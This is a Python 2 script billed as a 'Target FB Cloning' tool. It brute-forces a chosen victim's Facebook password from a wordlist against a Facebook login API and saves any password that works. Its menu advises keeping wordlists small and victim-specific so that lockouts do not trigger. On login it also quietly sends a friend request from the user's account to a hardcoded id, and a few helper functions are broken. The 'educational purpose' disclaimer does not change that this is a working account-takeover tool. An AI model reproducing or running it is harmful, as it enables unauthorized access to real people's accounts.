#!/usr/bin/python2
#coding=utf-8
#This Script Is Written By Muhammad Hamza
#Editing My Script Will Not Make You A Codder
  #=================================#
  # Hamza The Official Programmrer  #   #                                 #
  #             [ H.O.P ]           #
  #=================================#

#Modules
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

#Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def exit():
	print ("[!] Exit")
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
#Banner
banner = """
\033[1;97m            _______    _______ 
\033[1;97m|\     /|  (  ___  )  (  ____ )
\033[1;97m| )   ( |  | (   ) |  | (    )|
\033[1;97m| (___) |  | |   | |  | (____)|
\033[1;97m|  ___  |  | |   | |  |  _____)
\033[1;97m| (   ) |  | |   | |  | (      
\033[1;97m| )   ( |  | (___) |  | )      
\033[1;97m|/     \|  (_______)  |/\033[1;32m [ Target FB Cloning ]
                                 
\033[1;97m---------------------------------------------------
 
\033[1;97m➣ Coder     : Muhammad Hamza
\033[1;97m➣ Github    : https://github.com/Hamzahash
\033[1;97m➣ Instagram : muhammad.hamza1626
\033[1;97m➣ Youtube   : HOP Anonymous
\033[1;97m➣ Caution   : For Edu Pupose.\033[1;92mTarget FB Cloning.

\033[1;97m---------------------------------------------------"""




# titik #
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[!] \033[1;97mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
id = []
em = []
hp = []
##### ToolLogin #####
#=================#
def tlogin():
	os.system('clear')
	print banner
	username = raw_input("[+] What Is Your Name? : ")
	time.sleep(1)
	print'               '
	os.system('date')
	print'                  '
	hamza('[!] Welcome ' + username )
	print'               '
	hamza('[!] Use Your Own Passlist For Cloning.')
	print'               '
	hamza('[!] This Is For Educational Purpose Only.')
	print'               '
	hamza('[!] Im Not Responsible For Any Illegal Act.')
	print'                '
	passw = raw_input("[+] TOOL PASSCODE   : ")
	
	if passw =="":
		print"\033[1;91m[!] Wrong"
		tlogin()
	elif passw =="1626":
		hamza('[✔] Tool Login Successful')
		os.system('xdg-open https://www.youtube.com/channel/UCPRlRzOAEH8mcB1WtXf4Q1w')
		time.sleep(0.1)
		try:
			toket = open('login.txt','r')
			menu()
		except (KeyError,IOError):
			ttlog()
	else:
		print "[!] Wrong Input"
		time.sleep(0.1)
		exit()

##### Menu Login #####
def ttlog():
	os.system('clear')
	print banner
	print "[1] Login With Facebook."
	print "[2] Login Using Token."
	print "[3] Watch Video To Create Passlist"
	print "[0] Exit"
	print ('      ')
	msuk = raw_input("Choose Option >  ")
	if msuk =="":
		print"[!]  Wrong Input"
		exit()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="3":
	    os.system('xdg-open https://youtu.be/19AXObvgO3Q')
	    ttlog()
	elif msuk =="0":
		exit()
	else:
		print"[!] Wrong Input"
		exit()
		
##### LOGIN #####
#================#
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print banner
		os.system('date')
		hamza('[+] Login Your Facebook Account')
		hamza('[!] Donot Use Your Personal Account')
		print"[!] Use a New Facebook Account To Login"
		
		id = raw_input('[+] Number/Username/Id : ')
		pwd = raw_input('[+] Password           : ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"[!] No Internet Connection"
			exit()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				hamza('[✔] Logged In Successfully')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				os.system('xdg-open https://www.youtube.com/channel/UCPRlRzOAEH8mcB1WtXf4Q1w')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				os.system('python2 tar.py')
		if 'checkpoint' in url:
			hamza('[!] Account Is On Checkpoint')
			os.system('rm -rf login.txt')
			time.sleep(3)
			os.system('python2 tar.py')
		else:
			print("[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(3)
			ttlog()
			
##### TOKEN #####
def tokenz():
	os.system('clear')
	print banner
	print('        ')
	toket = raw_input("\033[1;97m[?] \033[1;97mToken\033[1;97m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "[!] Wrong Token"
		e = raw_input("[?] Do You Want To PickUp Token?: ")
		if e =="":
			exit()
		elif e =="y":
			login()
		else:
			exit()
#MainMenu			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"[!] Account Is On Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	except requests.exceptions.ConnectionError:
		print"[!] No Connection"
		exit()
	os.system("clear")
	print banner
	print "║[✔] Name : "+nama
	print "║[✔] ID   : "+id
	print "\033[1;97m╚"+40*"═"
	print('-----------------------')
	print "[1] Start Target Cloning."
	print "[2] Tips For Tar Cloning."
	print "[3] Follow Me On Facebook."
	print "[4] Logout."
	print "[5] Exit."
	print "[6] Subscribe To My Channel."
	print ('                  ')
	hack()
	
	
def hack():
    h = raw_input("Choose Option >  ")
    if h =="":
        print "[!] Wrong Input"
        hack()
    elif h =="1":
        brute()
    elif h =="2":
        os.system ('clear')
        print banner
        os.system('date')
        print ('                ')
        hamza('\033[1;97m[!] Dear User ! Please Read It Carefully.')
        print'                  '
        hamza('[1] Please Create Your Own Passlist According To The Victims Account.')
        print'                  '
        hamza('[2] If You Use a Passlist Having 700+ Password.Then You Will Not Be Able To Target Victim Account.')
        print'                  '
        hamza('[3] Facebook Blocks The Login System After Too Much Failure Passwords.')
        print'                  '
        hamza('[4] So,I Will Suggest You To Create a Small Passlist According To The Victims Accounts.')
        print'                  '
        hamza('[5] If You Dont Know About How To Create a Passlist Then Visit My Channel You Will Find a Video Related To It.')
        print'                  '
        hamza('[6] Contact Me On Facebook / Instagram / Whatsapp For Any Kind Of Help.')
        print'                  '
        raw_input("\n\033[1;97m[ \033[1;97mPress Enter To Back \033[1;97m]")
        menu()
        
    elif h =="3":
        os.system('xdg-open https://www.facebook.com/muhammad.hamza1626')
        menu()
    elif h =="4":
        os.system('rm -rf login.txt')
        hamza('Account Logged Out Successfully.')
        ttlog()
    elif h =="5":
        time.sleep(1)
        os.system('exit')
    elif h =="6":
        os.system('xdg-open https://www.youtube.com/channel/UCPRlRzOAEH8mcB1WtXf4Q1w')
        menu()
    else:
		print "[!] Wrong Input"
		hack()
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print banner
        try:
            email = raw_input('[+] Target ID/Email   : ')
            passw = raw_input('[+] Passlist/Wordlist : ')
            total = open(passw, 'r')
            total = total.readlines()
            hamza('------------------------------------')
            print '[✔] Victim/Targrt Account : ' + email
            time.sleep(0.05)
            print '[✔] Total Passwords Found : ' + str(len(total))
            time.sleep(0.05)
            hamza('[✔] The Process Has Been Started.')
            hamza('[!] Press CTRL Z To Stop Process.')
            hamza('------------------------------------')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;97m[✔] Trying Password : ' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' ● ' + pw + '\n')
                        dapat.close()
                        hamza('\n\033[1;32m[✔] Password Founded Successfuly')
                        hamza('------------------------------------')
                        print '\033[1;32m[✔] Username : ' + email
                        print '\033[1;32m[✔] Password : ' + pw
                        raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
                        menu()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            hamza('\033[1;32m[✔] Password Founded Successfuly')
                            print '\x1b[1;97m[!] \x1b[1;97mAccount Maybe On Checkpoint'
                            time.sleep(0.05)
                            print '\033[1;32m[✔] Username : ' + email
                            time.sleep(0.05)
                            print '\033[1;32m[✔] Password : ' + pw
                            raw_input("\n\033[1;97m[ \033[1;97mBack \033[1;97m]")
                            menu()
                            
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;97m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;97m[!] File not found...'
            print """\n\x1b[1;97m[!] \x1b[1;97mTry Another Passlist."""
            brute()
if __name__ == '__main__':
	tlogin()
